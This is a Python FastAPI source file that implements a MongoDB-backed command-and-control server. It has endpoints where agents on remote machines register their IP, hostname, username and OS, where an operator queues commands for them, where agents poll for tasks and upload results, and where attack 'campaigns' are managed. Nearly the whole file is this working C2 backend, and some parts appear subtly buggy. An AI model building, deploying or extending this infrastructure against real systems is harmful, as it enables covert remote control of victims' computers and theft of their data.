import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pymongo import MongoClient
from bson.objectid import ObjectId

app = FastAPI()

# Initialize the MongoDB client
client = MongoClient("mongodb://mongo:27017/")
db = client["database"]
connections = db["connections"]
campaigns = db["campaigns"]
tasks = db["tasks"]

# ----------------------------------------------------------------------------------------------
# API endpoints to interact with the command and control service
# list all connections
@app.get('/c2/list-connections')
async def list_connections():
    connection_list = []

    # Query MongoDB for a list of connections
    for connection in connections.find():
        connection['_id'] = str(connection['_id'])
        connection_list.append(connection)

    print("Connection list: " + str(connection_list))

    # Return the list of connections
    return {'connection_list': connection_list}

# get a connection from the database
@app.get('/c2/get-connection/{connection_id}')
async def get_connection(connection_id: str):
    print("Retrieving agent details from connection ID: " + connection_id)
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # Convert ObjectId to string
    connection['_id'] = str(connection['_id'])

    print("Connection details: " + str(connection))

    # Return the connection
    return {'connection': connection}

# register a new connection
@app.post('/c2/register')
async def register_connection(request: Request):
    data = await request.json()

    # transform the data into a dictionary
    data = dict(data)

    # check if the connection has the required fields
    if 'ip_address' not in data or 'hostname' not in data or 'username' not in data or 'os' not in data:
        raise HTTPException(status_code=400, detail="Missing required fields")
    
    # Add the timestamp to the connection
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Insert the connection into MongoDB
    connection_id = connections.insert_one(data).inserted_id

    return {'message': 'Connection registered successfully', 'connection_id': str(connection_id)}

# unregister a connection
@app.delete('/c2/unregister/{connection_id}')
async def unregister_connection(connection_id: str):
    # Delete the connection from MongoDB
    connections.delete_one({"_id": ObjectId(connection_id)})

    return {'message': 'Connection unregistered successfully', 'connection_id': connection_id}

# add a new command to the database
@app.post('/c2/add-command/{connection_id}')
async def add_command(connection_id: str, request: Request):
    print("Adding command to task list for connection ID: " + connection_id)
    data = await request.json()

    # Add the timestamp to the command
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # add the command to the task list with the connection ID as an additional field to be able to identify the agent
    data['connection_id'] = connection_id

    # add the command as input to the task list
    data['input'] = data['command']

    # set the status of the command to pending
    data['status'] = 'pending'

    print("Adding command to task list: " + str(data))

    task_id = tasks.insert_one(data).inserted_id

    return {'message': 'Command added successfully', 'task_id': str(task_id)}

# return the new commands for the client from the database based on the connection ID
@app.get('/c2/get-commands/{connection_id}')
async def get_commands(connection_id: str):
    # retrieve all tasks for the connection ID with the status 'pending'
    task_list = []
    for task in tasks.find({"connection_id": connection_id, "status": "pending"}):
        task['_id'] = str(task['_id'])
        task_list.append(task)
    
    # set the status of the tasks to 'sent' to prevent the client from receiving the same tasks again
    tasks.update_many({"connection_id": connection_id, "status": "pending"}, {"$set": {"status": "sent"}})

    print("Task list: ")
    print(task_list)

    # send the task list to the client
    return {'task_list': task_list}

# get a list of all commands for one connection from the database to be displayed in the web interface
@app.get('/c2/get-command-list/{connection_id}')
async def get_command_list(connection_id: str):
    # Retrieve the task list from MongoDB
    task_list = []
    for task in tasks.find({"connection_id": connection_id}):
        task['_id'] = str(task['_id'])
        task_list.append(task)

    # Return the task list
    return {'task_list': task_list}

# get the command output for one connection from the database
@app.get('/c2/get-command-output/{connection_id}')
async def get_command_output(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # Return the connection's command output
    return {'command_output': connection['command_output']}

# add the command output to the database
@app.post('/c2/add-command-output/{connection_id}/{task_id}')
async def add_command_output(connection_id: str, task_id: str, request: Request):
    data = await request.json()

    # Add the timestamp to the command output
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print("Adding command output to task list: " + str(data))

    # add the task output to the task
    tasks.update_one({"_id": ObjectId(task_id)}, {"$set": {"output": data['output'], "timestamp": timestamp, "status": "completed"}})

    # return message
    return {'message': 'Command output added successfully', 'connection_id': connection_id, 'task_id': task_id}

# ----------------------------------------------------------------------------------------------
# API endpoints to interact with the campaign management service
# list all campaigns
@app.get('/campaigns/list-campaigns')
async def list_campaigns():
    campaign_list = []

    # Query MongoDB for a list of campaigns
    for campaign in campaigns.find():
        campaign_list.append(campaign)

    # Return the list of campaigns
    return {'campaign_list': campaign_list}

# create a new campaign
@app.post('/campaigns/create')
async def create_campaign(request: Request):
    data = await request.json()

    # Insert the campaign into MongoDB
    campaign_id = campaigns.insert_one(data).inserted_id

    return {'message': 'Campaign created successfully', 'campaign_id': str(campaign_id)}

# delete a campaign
@app.delete('/campaigns/delete/{campaign_id}')
async def delete_campaign(campaign_id: str):
    # Delete the campaign from MongoDB
    campaigns.delete_one({"_id": ObjectId(campaign_id)})

    return {'message': 'Campaign deleted successfully', 'campaign_id': campaign_id}

# get a campaign from the database
@app.get('/campaign/{campaign_id}')
async def get_campaign(campaign_id: str):
    # Retrieve the campaign from MongoDB
    campaign = campaigns.find_one({"_id": ObjectId(campaign_id)})
    if not campaign:
        return HTMLResponse(content="Campaign not found", status_code=404)

    # Return the campaign
    return {'campaign': campaign}
